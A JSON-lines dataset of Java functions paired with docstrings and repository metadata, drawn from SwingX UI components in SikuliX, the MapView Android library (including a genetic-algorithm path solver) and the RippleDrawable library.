{"docstring": "/**\n * Creates new EyeDropperColorChooserPanel\n */\n", "func_signal": "public EyeDropperColorChooserPanel()", "code": "{\n    initComponents();\n    MouseInputAdapter mia = new MouseInputAdapter() {\n        @Override\n        public void mousePressed(MouseEvent evt) {\n        }\n        @Override\n        public void mouseDragged(MouseEvent evt) {\n            Point pt = evt.getPoint();\n            SwingUtilities.convertPointToScreen(pt,evt.getComponent());\n            ((MagnifyingPanel)magPanel).setMagPoint(pt);\n        }\n        @Override\n        public void mouseReleased(MouseEvent evt) {\n            Color newColor = new Color(((MagnifyingPanel)magPanel).activeColor);\n            getColorSelectionModel().setSelectedColor(newColor);\n        }\n    };\n    eyeDropper.addMouseListener(mia);\n    eyeDropper.addMouseMotionListener(mia);\n    try {\n        eyeDropper.setIcon(new ImageIcon(\n                EyeDropperColorChooserPanel.class.getResource(\"mag.png\")));\n        eyeDropper.setText(\"\");\n    } catch (Exception ex) {\n        ex.printStackTrace();\n    }\n\n    magPanel.addPropertyChangeListener(new PropertyChangeListener() {\n        public void propertyChange(PropertyChangeEvent evt) {\n            Color color = new Color(((MagnifyingPanel)magPanel).activeColor);\n            activeColor.setBackground(color);\n            hexColor.setText(PaintUtils.toHexString(color).substring(1));\n            rgbColor.setText(color.getRed() +\",\" + color.getGreen() + \",\" + color.getBlue());\n        }\n    });\n}", "path": "IDE\\src\\main\\java\\org\\jdesktop\\swingx\\color\\EyeDropperColorChooserPanel.java", "repo_name": "RaiMan/SikuliX-2014", "stars": 806, "license": "None", "language": "java", "size": 169878}
{"docstring": "/**\n *\n * Hack around AbstractPainter.paint bug which disposes the Graphics.\n * So here we give it a scratch to paint on. <p>\n * TODO - remove again, the issue is fixed?\n *\n * @param g the graphics to paint on\n */\n", "func_signal": "private void paintPainter(Graphics g)", "code": "{\n    if (painter == null) return;\n    // fail fast: we assume that g must not be null\n    // which throws an NPE here instead deeper down the bowels\n    // this differs from corresponding core implementation!\n    Graphics2D scratch = (Graphics2D) g.create();\n    try {\n        painter.paint(scratch, this, getWidth(), getHeight());\n    }\n    finally {\n        scratch.dispose();\n    }\n}", "path": "IDE\\src\\main\\java\\org\\jdesktop\\swingx\\renderer\\JRendererCheckBox.java", "repo_name": "RaiMan/SikuliX-2014", "stars": 806, "license": "None", "language": "java", "size": 169878}
{"docstring": "/** This method is called from within the constructor to\n * initialize the form.\n * WARNING: Do NOT modify this code. The content of this method is\n * always regenerated by the Form Editor.\n */\n// <editor-fold defaultstate=\"collapsed\" desc=\" Generated Code \">//GEN-BEGIN:initComponents\n", "func_signal": "private void initComponents()", "code": "{\n    java.awt.GridBagConstraints gridBagConstraints;\n\n    eyeDropper = new javax.swing.JButton();\n    magPanel = new MagnifyingPanel();\n    activeColor = new JXColorSelectionButton();\n    hexColor = new javax.swing.JTextField();\n    JTextArea jTextArea1 = new JTextArea();\n    jLabel1 = new javax.swing.JLabel();\n    rgbColor = new javax.swing.JTextField();\n    JLabel jLabel2 = new JLabel();\n\n    setLayout(new java.awt.GridBagLayout());\n\n    eyeDropper.setText(\"eye\");\n    add(eyeDropper, new java.awt.GridBagConstraints());\n\n    magPanel.setLayout(new java.awt.BorderLayout());\n\n    magPanel.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 0, 0)));\n    magPanel.setMinimumSize(new java.awt.Dimension(100, 100));\n    magPanel.setPreferredSize(new java.awt.Dimension(100, 100));\n    gridBagConstraints = new java.awt.GridBagConstraints();\n    gridBagConstraints.gridx = 0;\n    gridBagConstraints.gridy = 1;\n    gridBagConstraints.gridheight = 3;\n    gridBagConstraints.fill = java.awt.GridBagConstraints.BOTH;\n    gridBagConstraints.insets = new java.awt.Insets(0, 0, 0, 12);\n    add(magPanel, gridBagConstraints);\n\n    activeColor.setEnabled(false);\n    activeColor.setPreferredSize(new java.awt.Dimension(40, 40));\n    gridBagConstraints = new java.awt.GridBagConstraints();\n    gridBagConstraints.gridx = 2;\n    gridBagConstraints.gridy = 3;\n    gridBagConstraints.fill = java.awt.GridBagConstraints.BOTH;\n    gridBagConstraints.insets = new java.awt.Insets(2, 0, 2, 0);\n    add(activeColor, gridBagConstraints);\n\n    hexColor.setEditable(false);\n    gridBagConstraints = new java.awt.GridBagConstraints();\n    gridBagConstraints.gridx = 2;\n    gridBagConstraints.gridy = 1;\n    gridBagConstraints.fill = java.awt.GridBagConstraints.HORIZONTAL;\n    gridBagConstraints.insets = new java.awt.Insets(2, 0, 2, 0);\n    add(hexColor, gridBagConstraints);\n\n    jTextArea1.setColumns(20);\n    jTextArea1.setEditable(false);\n    jTextArea1.setLineWrap(true);\n    jTextArea1.setRows(5);\n    jTextArea1.setText(\"Drag the magnifying glass to select a color from the screen.\");\n    jTextArea1.setWrapStyleWord(true);\n    jTextArea1.setOpaque(false);\n    gridBagConstraints = new java.awt.GridBagConstraints();\n    gridBagConstraints.gridwidth = 2;\n    gridBagConstraints.fill = java.awt.GridBagConstraints.HORIZONTAL;\n    gridBagConstraints.anchor = java.awt.GridBagConstraints.NORTH;\n    gridBagConstraints.weightx = 10.0;\n    gridBagConstraints.weighty = 10.0;\n    gridBagConstraints.insets = new java.awt.Insets(0, 0, 7, 0);\n    add(jTextArea1, gridBagConstraints);\n\n    jLabel1.setText(\"#\");\n    gridBagConstraints = new java.awt.GridBagConstraints();\n    gridBagConstraints.gridx = 1;\n    gridBagConstraints.gridy = 1;\n    gridBagConstraints.anchor = java.awt.GridBagConstraints.EAST;\n    gridBagConstraints.insets = new java.awt.Insets(0, 4, 0, 4);\n    add(jLabel1, gridBagConstraints);\n\n    rgbColor.setEditable(false);\n    rgbColor.setText(\"255,255,255\");\n    gridBagConstraints = new java.awt.GridBagConstraints();\n    gridBagConstraints.gridx = 2;\n    gridBagConstraints.gridy = 2;\n    gridBagConstraints.fill = java.awt.GridBagConstraints.HORIZONTAL;\n    gridBagConstraints.insets = new java.awt.Insets(2, 0, 2, 0);\n    add(rgbColor, gridBagConstraints);\n\n    jLabel2.setText(\"RGB\");\n    gridBagConstraints = new java.awt.GridBagConstraints();\n    gridBagConstraints.gridx = 1;\n    gridBagConstraints.gridy = 2;\n    gridBagConstraints.anchor = java.awt.GridBagConstraints.EAST;\n    gridBagConstraints.insets = new java.awt.Insets(0, 4, 0, 4);\n    add(jLabel2, gridBagConstraints);\n\n}", "path": "IDE\\src\\main\\java\\org\\jdesktop\\swingx\\color\\EyeDropperColorChooserPanel.java", "repo_name": "RaiMan/SikuliX-2014", "stars": 806, "license": "None", "language": "java", "size": 169878}
{"docstring": "/**\n * {@inheritDoc}\n */\n", "func_signal": "@Override\npublic void setPainter(Painter painter)", "code": "{\n    Painter old = getPainter();\n    this.painter = painter;\n    firePropertyChange(\"painter\", old, getPainter());\n}", "path": "IDE\\src\\main\\java\\org\\jdesktop\\swingx\\renderer\\JRendererCheckBox.java", "repo_name": "RaiMan/SikuliX-2014", "stars": 806, "license": "None", "language": "java", "size": 169878}
{"docstring": "/**\n * @param model\n */\n", "func_signal": "public TableSortController(M model)", "code": "{\n    super();\n    setModel(model);\n}", "path": "IDE\\src\\main\\java\\org\\jdesktop\\swingx\\sort\\TableSortController.java", "repo_name": "RaiMan/SikuliX-2014", "stars": 806, "license": "None", "language": "java", "size": 169878}
{"docstring": "/**\n * {@inheritDoc} <p>\n * Overridden to set the button's selected state and text.<p>\n *\n *  PENDING: set icon?\n *\n *  @see #getValueAsBoolean(CellContext)\n *  @see #getValueAsString(CellContext)\n */\n", "func_signal": "@Override\nprotected void format(CellContext context)", "code": "{\n    rendererComponent.setSelected(getValueAsBoolean(context));\n    rendererComponent.setText(getValueAsString(context));\n}", "path": "IDE\\src\\main\\java\\org\\jdesktop\\swingx\\renderer\\CheckBoxProvider.java", "repo_name": "RaiMan/SikuliX-2014", "stars": 806, "license": "None", "language": "java", "size": 169878}
{"docstring": "/**\n * {@inheritDoc}<p>\n * Note: must implement same logic as the overridden comparator\n * lookup, otherwise will throw ClassCastException because\n * here the comparator is never null. <p>\n *\n * PENDING JW: think about implications to string value lookup!\n *\n * @throws IndexOutOfBoundsException {@inheritDoc}\n */\n", "func_signal": "@Override\nprotected boolean useToString(int column)", "code": "{\n    Comparator<?> comparator = super.getComparator(column);\n    if (comparator != null) {\n        return false;\n    }\n    Class<?> columnClass = getModel().getColumnClass(column);\n    if (columnClass == String.class) {\n        return false;\n    }\n    if (Comparable.class.isAssignableFrom(columnClass)) {\n        return false;\n    }\n    return true;\n}", "path": "IDE\\src\\main\\java\\org\\jdesktop\\swingx\\sort\\TableSortController.java", "repo_name": "RaiMan/SikuliX-2014", "stars": 806, "license": "None", "language": "java", "size": 169878}
{"docstring": "/**\n * Example usage\n */\n", "func_signal": "public static void main(String ... args)", "code": "{\n    SwingUtilities.invokeLater(new Runnable() {\n        public void run() {\n            JColorChooser chooser = new JColorChooser();\n            chooser.addChooserPanel(new EyeDropperColorChooserPanel());\n            JFrame frame = new JFrame();\n            frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n            frame.add(chooser);\n            frame.pack();\n            frame.setVisible(true);\n        }\n    });\n}", "path": "IDE\\src\\main\\java\\org\\jdesktop\\swingx\\color\\EyeDropperColorChooserPanel.java", "repo_name": "RaiMan/SikuliX-2014", "stars": 806, "license": "None", "language": "java", "size": 169878}
{"docstring": "/**\n * {@inheritDoc} <p>\n *\n * Overridden to return false if painting flag is true.<p>\n *\n */\n", "func_signal": "@Override\npublic boolean isContentAreaFilled()", "code": "{\n    if (fakeTransparency) {\n        return false;\n    }\n    return super.isContentAreaFilled();\n}", "path": "IDE\\src\\main\\java\\org\\jdesktop\\swingx\\renderer\\JRendererCheckBox.java", "repo_name": "RaiMan/SikuliX-2014", "stars": 806, "license": "None", "language": "java", "size": 169878}
{"docstring": "/**\n * Instantiates a CheckBoxProvider with the given StringValue and\n * alignment.\n *\n * @param stringValue the StringValue to use for formatting.\n * @param alignment the horizontalAlignment.\n */\n", "func_signal": "public CheckBoxProvider(StringValue stringValue, int alignment)", "code": "{\n    super(stringValue == null ? StringValues.EMPTY : stringValue, alignment);\n    setBorderPainted(true);\n}", "path": "IDE\\src\\main\\java\\org\\jdesktop\\swingx\\renderer\\CheckBoxProvider.java", "repo_name": "RaiMan/SikuliX-2014", "stars": 806, "license": "None", "language": "java", "size": 169878}
{"docstring": "/**\n * Returns a boolean representation of the content.<p>\n *\n * This method messages the\n * <code>BooleanValue</code> to get the boolean rep. If none available,\n * checks for Boolean type directly and returns its value. Returns\n * false otherwise. <p>\n *\n * PENDING: fallback to check for boolean is convenient .. could cleanup\n *   to use a default BooleanValue instead.\n *\n * @param context the cell context, must not be null.\n * @return the boolean representation of the cell's content,\n *   or false if none if available.\n */\n", "func_signal": "protected boolean getValueAsBoolean(CellContext context)", "code": "{\n    if (formatter instanceof BooleanValue) {\n        return ((BooleanValue) formatter).getBoolean(context.getValue());\n    }\n    return Boolean.TRUE.equals(context.getValue());\n}", "path": "IDE\\src\\main\\java\\org\\jdesktop\\swingx\\renderer\\CheckBoxProvider.java", "repo_name": "RaiMan/SikuliX-2014", "stars": 806, "license": "None", "language": "java", "size": 169878}
{"docstring": "/**\n * Overridden for performance reasons.\n * See the <a href=\"#override\">Implementation Note</a>\n * for more information.\n */\n", "func_signal": "@Override\nprotected void firePropertyChange(String propertyName, Object oldValue, Object newValue)", "code": "{\n    // Strings get interned...\n    if (\"text\".equals(propertyName)) {\n        super.firePropertyChange(propertyName, oldValue, newValue);\n    }\n}", "path": "IDE\\src\\main\\java\\org\\jdesktop\\swingx\\renderer\\JRendererCheckBox.java", "repo_name": "RaiMan/SikuliX-2014", "stars": 806, "license": "None", "language": "java", "size": 169878}
{"docstring": "/**\n * {@inheritDoc} <p>\n *\n * Overridden to return false if painting flag is true.<p>\n *\n */\n", "func_signal": "@Override\npublic boolean isOpaque()", "code": "{\n    if (fakeTransparency) {\n        return false;\n    }\n    return super.isOpaque();\n}", "path": "IDE\\src\\main\\java\\org\\jdesktop\\swingx\\renderer\\JRendererCheckBox.java", "repo_name": "RaiMan/SikuliX-2014", "stars": 806, "license": "None", "language": "java", "size": 169878}
{"docstring": "/**\n * Sets the <code>TableModel</code> to use as the underlying model\n * for this <code>TableRowSorter</code>.  A value of <code>null</code>\n * can be used to set an empty model.\n *\n * @param model the underlying model to use, or <code>null</code>\n */\n", "func_signal": "public void setModel(M model)", "code": "{\n    tableModel = model;\n    if (model != null)\n        cachedModelRowCount = model.getRowCount();\n    setModelWrapper(new TableRowSorterModelWrapper());\n}", "path": "IDE\\src\\main\\java\\org\\jdesktop\\swingx\\sort\\TableSortController.java", "repo_name": "RaiMan/SikuliX-2014", "stars": 806, "license": "None", "language": "java", "size": 169878}
{"docstring": "/**\n * \u6a21\u62df\u8f6c\u76d8\uff0c\u8fdb\u884c\u5b50\u4ee3\u9009\u53d6\n *\n * @param ran\n * @return\n */\n", "func_signal": "private int wheelOut(int ran)", "code": "{\n    for (int i = 0; i < roulette.length; i++) {\n        if (ran <= roulette[i]) {\n            return i;\n        }\n    }\n    return 0;\n}", "path": "library\\src\\main\\java\\com\\onlylemi\\mapview\\library\\utils\\math\\GeneticAlgorithm.java", "repo_name": "onlylemi/MapView", "stars": 666, "license": "mit", "language": "java", "size": 161}
{"docstring": "/**\n * reload mapview\n */\n", "func_signal": "public void refresh()", "code": "{\n    if (holder != null) {\n        Canvas canvas = holder.lockCanvas();\n        if (canvas != null) {\n            canvas.drawColor(-1);\n            if (isMapLoadFinish) {\n                for (MapBaseLayer layer : layers) {\n                    if (layer.isVisible) {\n                        layer.draw(canvas, currentMatrix, currentZoom, currentRotateDegrees);\n                    }\n                }\n            }\n            holder.unlockCanvasAndPost(canvas);\n        }\n    }\n}", "path": "library\\src\\main\\java\\com\\onlylemi\\mapview\\library\\MapView.java", "repo_name": "onlylemi/MapView", "stars": 666, "license": "mit", "language": "java", "size": 161}
{"docstring": "/**\n * is/not obtuse angle between a point and a line\n *\n * @param point\n * @param linePoint1\n * @param linePoint2\n * @return\n */\n", "func_signal": "public static boolean isObtuseAnglePointAndLine(PointF point, PointF linePoint1, PointF\n        linePoint2)", "code": "{\n    // A*A + B*B < C*C\n    float p_l1, p_l2, l1_l2;\n    p_l1 = getDistanceBetweenTwoPoints(point, linePoint1);\n    p_l2 = getDistanceBetweenTwoPoints(point, linePoint2);\n    l1_l2 = getDistanceBetweenTwoPoints(linePoint1, linePoint2);\n\n    return ((p_l1 * p_l1 + l1_l2 * l1_l2) < p_l2 * p_l2)\n            || ((p_l2 * p_l2 + l1_l2 * l1_l2) < p_l1 * p_l1);\n}", "path": "library\\src\\main\\java\\com\\onlylemi\\mapview\\library\\utils\\MapMath.java", "repo_name": "onlylemi/MapView", "stars": 666, "license": "mit", "language": "java", "size": 161}
{"docstring": "/**\n * \u8bc4\u4f30\u6700\u597d\u7684\u4e2a\u4f53\n */\n", "func_signal": "private void evaluateBestIndivial()", "code": "{\n    for (int i = 0; i < population.length; i++) {\n        values[i] = calculateIndivialDist(population[i]);\n    }\n    evaluateBestCurrentDist();\n    if (bestDist == 0 || bestDist > currentBestDist) {\n        bestDist = currentBestDist;\n        bestIndivial = population[currentBestPosition].clone();\n    }\n}", "path": "library\\src\\main\\java\\com\\onlylemi\\mapview\\library\\utils\\math\\GeneticAlgorithm.java", "repo_name": "onlylemi/MapView", "stars": 666, "license": "mit", "language": "java", "size": 161}
{"docstring": "/**\n * point is/not in floor plan\n *\n * @param x\n * @param y\n * @return\n */\n", "func_signal": "public boolean withFloorPlan(float x, float y)", "code": "{\n    float[] goal = convertMapXYToScreenXY(x, y);\n    return goal[0] > 0 && goal[0] < mapLayer.getImage().getWidth() && goal[1] > 0\n            && goal[1] < mapLayer.getImage().getHeight();\n}", "path": "library\\src\\main\\java\\com\\onlylemi\\mapview\\library\\MapView.java", "repo_name": "onlylemi/MapView", "stars": 666, "license": "mit", "language": "java", "size": 161}
{"docstring": "/**\n * \u6839\u636e\u7236\u4ee3\u6c42\u5b50\u4ee3\n *\n * @param x\n * @param y\n * @param pos\n * @return\n */\n", "func_signal": "private int[] getChild(int x, int y, int pos)", "code": "{\n    int[] solution = new int[pointNum];\n    int[] px = population[x].clone();\n    int[] py = population[y].clone();\n\n    int dx = 0, dy = 0;\n    int c = px[random(px.length)];\n    solution[0] = c;\n\n    for (int i = 1; i < pointNum; i++) {\n        int posX = indexOf(px, c);\n        int posY = indexOf(py, c);\n\n        if (pos == PREVIOUS) {\n            dx = px[(posX + px.length - 1) % px.length];\n            dy = py[(posY + py.length - 1) % py.length];\n        } else if (pos == NEXT) {\n            dx = px[(posX + px.length + 1) % px.length];\n            dy = py[(posY + py.length + 1) % py.length];\n        }\n\n        for (int j = posX; j < px.length - 1; j++) {\n            px[j] = px[j + 1];\n        }\n        px = Arrays.copyOfRange(px, 0, px.length - 1);\n        for (int j = posY; j < py.length - 1; j++) {\n            py[j] = py[j + 1];\n        }\n        py = Arrays.copyOfRange(py, 0, py.length - 1);\n\n        c = dist[c][dx] < dist[c][dy] ? dx : dy;\n\n        solution[i] = c;\n    }\n    return solution;\n}", "path": "library\\src\\main\\java\\com\\onlylemi\\mapview\\library\\utils\\math\\GeneticAlgorithm.java", "repo_name": "onlylemi/MapView", "stars": 666, "license": "mit", "language": "java", "size": 161}
{"docstring": "/**\n * the distance between two points\n *\n * @param start\n * @param end\n * @return\n */\n", "func_signal": "public static float getDistanceBetweenTwoPoints(PointF start, PointF end)", "code": "{\n    return (float) Math.sqrt(Math.pow(end.x - start.x, 2)\n            + Math.pow(end.y - start.y, 2));\n}", "path": "library\\src\\main\\java\\com\\onlylemi\\mapview\\library\\utils\\MapMath.java", "repo_name": "onlylemi/MapView", "stars": 666, "license": "mit", "language": "java", "size": 161}
{"docstring": "/**\n * set rotate degrees\n *\n * @param degrees\n * @param x\n * @param y\n */\n", "func_signal": "public void setCurrentRotateDegrees(float degrees, float x, float y)", "code": "{\n    currentMatrix.postRotate(degrees - currentRotateDegrees, x, y);\n\n    currentRotateDegrees = degrees % 360;\n    currentRotateDegrees = currentRotateDegrees > 0 ? currentRotateDegrees :\n            currentRotateDegrees + 360;\n}", "path": "library\\src\\main\\java\\com\\onlylemi\\mapview\\library\\MapView.java", "repo_name": "onlylemi/MapView", "stars": 666, "license": "mit", "language": "java", "size": 161}
{"docstring": "/**\n * \u53d8\u5f02\n */\n", "func_signal": "private void mutation()", "code": "{\n    for (int i = 0; i < populationSize; i++) {\n        if (Math.random() < mutationProbability) {\n            if (Math.random() > 0.5) {\n                population[i] = insertMutate(population[i]);\n            } else {\n                population[i] = exchangeMutate(population[i]);\n            }\n            i--;\n        }\n    }\n}", "path": "library\\src\\main\\java\\com\\onlylemi\\mapview\\library\\utils\\math\\GeneticAlgorithm.java", "repo_name": "onlylemi/MapView", "stars": 666, "license": "mit", "language": "java", "size": 161}
{"docstring": "/**\n * set point to map center\n *\n * @param x\n * @param y\n */\n", "func_signal": "public void mapCenterWithPoint(float x, float y)", "code": "{\n    float[] goal = {x, y};\n    currentMatrix.mapPoints(goal);\n\n    float deltaX = getWidth() / 2 - goal[0];\n    float deltaY = getHeight() / 2 - goal[1];\n    currentMatrix.postTranslate(deltaX, deltaY);\n}", "path": "library\\src\\main\\java\\com\\onlylemi\\mapview\\library\\MapView.java", "repo_name": "onlylemi/MapView", "stars": 666, "license": "mit", "language": "java", "size": 161}
{"docstring": "/**\n * convert coordinate of map to coordinate of screen\n *\n * @param x\n * @param y\n * @return\n */\n", "func_signal": "public float[] convertMapXYToScreenXY(float x, float y)", "code": "{\n    Matrix invertMatrix = new Matrix();\n    float[] value = {x, y};\n    currentMatrix.invert(invertMatrix);\n    invertMatrix.mapPoints(value);\n    return value;\n}", "path": "library\\src\\main\\java\\com\\onlylemi\\mapview\\library\\MapView.java", "repo_name": "onlylemi/MapView", "stars": 666, "license": "mit", "language": "java", "size": 161}
{"docstring": "/**\n *\n */\n", "func_signal": "private void setRoulette()", "code": "{\n    //calculate all the fitness\n    for (int i = 0; i < values.length; i++) {\n        fitnessValues[i] = 1.0f / values[i]; // \u9002\u5e94\u5ea6\u4e3a\u8def\u5f84\u957f\u7684\u5bfc\u6570\n    }\n\n    //set the roulette\n    float sum = 0;\n    for (int i = 0; i < fitnessValues.length; i++) {\n        sum += fitnessValues[i];\n    }\n    for (int i = 0; i < roulette.length; i++) {\n        roulette[i] = fitnessValues[i] / sum;\n    }\n    for (int i = 1; i < roulette.length; i++) {\n        roulette[i] += roulette[i - 1];\n    }\n}", "path": "library\\src\\main\\java\\com\\onlylemi\\mapview\\library\\utils\\math\\GeneticAlgorithm.java", "repo_name": "onlylemi/MapView", "stars": 666, "license": "mit", "language": "java", "size": 161}
{"docstring": "/**\n * add layer\n *\n * @param layer\n */\n", "func_signal": "public void addLayer(MapBaseLayer layer)", "code": "{\n    if (layer != null) {\n        layers.add(layer);\n    }\n}", "path": "library\\src\\main\\java\\com\\onlylemi\\mapview\\library\\MapView.java", "repo_name": "onlylemi/MapView", "stars": 666, "license": "mit", "language": "java", "size": 161}
{"docstring": "/**\n * Get the coordinates of any point between two points\n *\n * @param start\n * @param end\n * @param value\n * @return\n */\n", "func_signal": "public static PointF getEveryPointBetweenTwoPoints(PointF start, PointF end, float value)", "code": "{\n    // y=kx+b\n    float x, y;\n    // with slope\n    if (start.x != end.x) {\n        float k = (end.y - start.y) / (end.x - start.x);\n        float b = end.y - k * end.x;\n\n        if (end.x > start.x) {\n            x = Math.min(end.x, start.x) + (end.x - start.x) * value;\n        } else {\n            x = Math.max(end.x, start.x) + (end.x - start.x) * value;\n        }\n        y = k * x + b;\n    } else { // no slope\n        x = start.x;\n        if (end.y > start.y) {\n            y = Math.min(end.y, start.y) + (end.y - start.y) * value;\n        } else {\n            y = Math.max(end.y, start.y) + (end.y - start.y) * value;\n        }\n    }\n    return new PointF(x, y);\n}", "path": "library\\src\\main\\java\\com\\onlylemi\\mapview\\library\\utils\\MapMath.java", "repo_name": "onlylemi/MapView", "stars": 666, "license": "mit", "language": "java", "size": 161}
{"docstring": "/**\n * Get a shortest distance from point to line\n *\n * @param point\n * @param linePoint1 Determine the first point of a straight line\n * @param linePoint2 Determine the second point of a straight line\n * @return\n */\n", "func_signal": "public static float getDistanceFromPointToLine(PointF point, PointF linePoint1, PointF\n        linePoint2)", "code": "{\n    // y = kx + b;\n    // d = |kx-y+b| / \u221a(k^2+1)\n    float d;\n    if (linePoint1.x != linePoint2.x) { // with slope\n        float k = (linePoint2.y - linePoint1.y) / (linePoint2.x - linePoint1.x);\n        float b = linePoint2.y - k * linePoint2.x;\n        d = Math.abs(k * point.x - point.y + b) / (float) Math.sqrt(k * k + 1);\n    } else { // no slope\n        d = Math.abs(point.x - linePoint1.x);\n    }\n    return d;\n}", "path": "library\\src\\main\\java\\com\\onlylemi\\mapview\\library\\utils\\MapMath.java", "repo_name": "onlylemi/MapView", "stars": 666, "license": "mit", "language": "java", "size": 161}
{"docstring": "/**\n * get intersection coordinates from a point to a line\n *\n * @param point\n * @param linePoint1\n * @param linePoint2\n * @return\n */\n", "func_signal": "public static PointF getIntersectionCoordinatesFromPointToLine(PointF point, PointF linePoint1, PointF\n        linePoint2)", "code": "{\n    // y = kx + b;\n    float x, y;\n    if (linePoint1.x != linePoint2.x) { // with slope\n        float k = (linePoint2.y - linePoint1.y) / (linePoint2.x - linePoint1.x);\n        float b = linePoint2.y - k * linePoint2.x;\n        // The equation of point\n        if (k != 0) {\n            float kV = -1 / k;\n            float bV = point.y - kV * point.x;\n            x = (b - bV) / (kV - k);\n            y = kV * x + bV;\n        } else {\n            x = point.x;\n            y = linePoint1.y;\n        }\n    } else { // no slope\n        x = linePoint1.x;\n        y = point.y;\n    }\n    return new PointF(x, y);\n}", "path": "library\\src\\main\\java\\com\\onlylemi\\mapview\\library\\utils\\MapMath.java", "repo_name": "onlylemi/MapView", "stars": 666, "license": "mit", "language": "java", "size": 161}
{"docstring": "/**\n * \u4ea4\u53c9\n */\n", "func_signal": "private void crossover()", "code": "{\n    int[] queue = new int[populationSize];\n    int num = 0;\n    for (int i = 0; i < populationSize; i++) {\n        if (Math.random() < crossoverProbability) {\n            queue[num] = i;\n            num++;\n        }\n    }\n    queue = Arrays.copyOfRange(queue, 0, num);\n    queue = shuffle(queue);\n    for (int i = 0; i < num - 1; i += 2) {\n        doCrossover(queue[i], queue[i + 1]);\n    }\n}", "path": "library\\src\\main\\java\\com\\onlylemi\\mapview\\library\\utils\\math\\GeneticAlgorithm.java", "repo_name": "onlylemi/MapView", "stars": 666, "license": "mit", "language": "java", "size": 161}
{"docstring": "/**\n * \u8ba1\u7b97\u4e2a\u4f53\u7684\u8ddd\u79bb\n *\n * @return\n */\n", "func_signal": "private float calculateIndivialDist(int[] indivial)", "code": "{\n    float sum = dist[indivial[0]][indivial[indivial.length - 1]];\n    for (int i = 1; i < indivial.length; i++) {\n        sum += dist[indivial[i]][indivial[i - 1]];\n    }\n    return sum;\n}", "path": "library\\src\\main\\java\\com\\onlylemi\\mapview\\library\\utils\\math\\GeneticAlgorithm.java", "repo_name": "onlylemi/MapView", "stars": 666, "license": "mit", "language": "java", "size": 161}
{"docstring": "/**\n * set rotate degrees\n *\n * @param degrees\n */\n", "func_signal": "public void setCurrentRotateDegrees(float degrees)", "code": "{\n    mapCenterWithPoint(getMapWidth() / 2, getMapHeight() / 2);\n    setCurrentRotateDegrees(degrees, getWidth() / 2, getHeight() / 2);\n}", "path": "library\\src\\main\\java\\com\\onlylemi\\mapview\\library\\MapView.java", "repo_name": "onlylemi/MapView", "stars": 666, "license": "mit", "language": "java", "size": 161}
{"docstring": "/**\n * the best path between some points (GeneticAlgorithm tsp)\n *\n * @param matrix\n * @return\n */\n", "func_signal": "public static List<Integer> getBestPathBetweenPointsByGeneticAlgorithm(float[][] matrix)", "code": "{\n    GeneticAlgorithm ga = GeneticAlgorithm.getInstance();\n    ga.setAutoNextGeneration(true);\n    ga.setMaxGeneration(200);\n    int[] best = ga.tsp(matrix);\n\n    List<Integer> result = new ArrayList<>(best.length);\n    for (int i = 0; i < best.length; i++) {\n        result.add(best[i]);\n    }\n    return result;\n}", "path": "library\\src\\main\\java\\com\\onlylemi\\mapview\\library\\utils\\MapMath.java", "repo_name": "onlylemi/MapView", "stars": 666, "license": "mit", "language": "java", "size": 161}
{"docstring": "/**\n * Retrieve the ColorStateList for the attribute at <var>index</var>.\n * The value may be either a single solid color or a reference to\n * a color or complex {@link ColorStateList} description.\n *\n * @param index Index of attribute to retrieve.\n * @return ColorStateList for the attribute, or null if not defined.\n */\n", "func_signal": "public static ColorStateList getColorStateList(Resources.Theme theme, TypedArray a,\n                                               TypedValue[] values, int index)", "code": "{\n    if (values != null && theme != null) {\n        TypedValue v = values[index];\n\n        if (v.type == TypedValue.TYPE_ATTRIBUTE) {\n            TEMP_ARRAY[0] = v.data;\n            TypedArray tmp = theme.obtainStyledAttributes(null, TEMP_ARRAY, 0, 0);\n            try {\n                return tmp.getColorStateList(0);\n            } finally {\n                tmp.recycle();\n            }\n        }\n    }\n\n    if (a != null) {\n        return a.getColorStateList(index);\n    }\n\n    return null;\n}", "path": "app\\src\\main\\java\\codetail\\graphics\\drawables\\TypedArrayCompat.java", "repo_name": "ozodrukh/RippleDrawable", "stars": 516, "license": "mit", "language": "java", "size": 373}
{"docstring": "/**\n * Extracts theme attributes from a typed array for later resolution using\n * {@link Resources.Theme#resolveAttributes(int[], int[])}.\n * Removes the entries from the typed array so that subsequent calls to typed\n * getters will return the default value without crashing.\n *\n * @return an array of length {@link TypedArray#getIndexCount()} populated with theme\n * attributes, or null if there are no theme attributes in the typed\n * array\n */\n", "func_signal": "public static TypedValue[] extractThemeAttrs(TypedArray array)", "code": "{\n    final int N = array.length();\n    TypedValue[] values = null;\n\n    for (int index = 0; index < N; index++) {\n        final TypedValue value = array.peekValue(index);\n\n        if (value == null || value.type != TYPE_ATTRIBUTE) {\n            continue;\n        }\n\n        final int attr = value.data;\n\n        if (attr == 0) {\n            continue;\n        }\n\n        if (values == null) {\n            values = new TypedValue[N];\n        }\n\n        values[index] = value;\n    }\n\n    return values;\n}", "path": "app\\src\\main\\java\\codetail\\graphics\\drawables\\TypedArrayCompat.java", "repo_name": "ozodrukh/RippleDrawable", "stars": 516, "license": "mit", "language": "java", "size": 373}
{"docstring": "/**\n * Looks for a layer with the given ID and returns its {@link Drawable}.\n * <p/>\n * If multiple layers are found for the given ID, returns the\n * {@link Drawable} for the matching layer at the highest index.\n *\n * @param id The layer ID to search for.\n * @return The {@link Drawable} for the highest-indexed layer that has the\n * given ID, or null if not found.\n */\n", "func_signal": "public Drawable findDrawableByLayerId(int id)", "code": "{\n    final ChildDrawable[] layers = mLayerState.mChildren;\n    for (int i = mLayerState.mNum - 1; i >= 0; i--) {\n        if (layers[i].mId == id) {\n            return layers[i].mDrawable;\n        }\n    }\n\n    return null;\n}", "path": "app\\src\\main\\java\\codetail\\graphics\\drawables\\LayerDrawable.java", "repo_name": "ozodrukh/RippleDrawable", "stars": 516, "license": "mit", "language": "java", "size": 373}
{"docstring": "/**\n * Jump all animations to their end state. The caller is responsible for\n * removing the ripple from the list of animating ripples.\n */\n", "func_signal": "public void jump()", "code": "{\n    mCanceled = true;\n    endSoftwareAnimations();\n    mCanceled = false;\n}", "path": "app\\src\\main\\java\\codetail\\graphics\\drawables\\Ripple.java", "repo_name": "ozodrukh/RippleDrawable", "stars": 516, "license": "mit", "language": "java", "size": 373}
